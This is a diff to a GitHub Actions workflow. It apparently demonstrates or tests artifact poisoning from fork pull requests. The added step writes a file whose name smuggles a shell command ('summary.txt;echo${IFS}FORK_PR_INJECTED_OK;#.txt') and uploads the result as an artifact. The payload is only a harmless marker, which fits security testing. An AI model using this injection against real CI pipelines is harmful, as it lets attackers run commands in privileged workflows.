@@ -9,4 +9,15 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - run: echo baseline test workflow (matches upstream merge-main.yml shape)
+      - name: Attacker-controlled artifact content (fork PR)
+        run: |
+          mkdir -p /tmp/content
+          printf 'hello from fork attacker pull request\n' > /tmp/content/summary.txt
+          printf '%s\n' '${{ github.event.number }}' > /tmp/content/pr_number.txt
+          printf 'x\n' > '/tmp/content/summary.txt;echo${IFS}FORK_PR_INJECTED_OK;#.txt'
+          ls -la /tmp/content
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: content-fork
+          path: /tmp/content
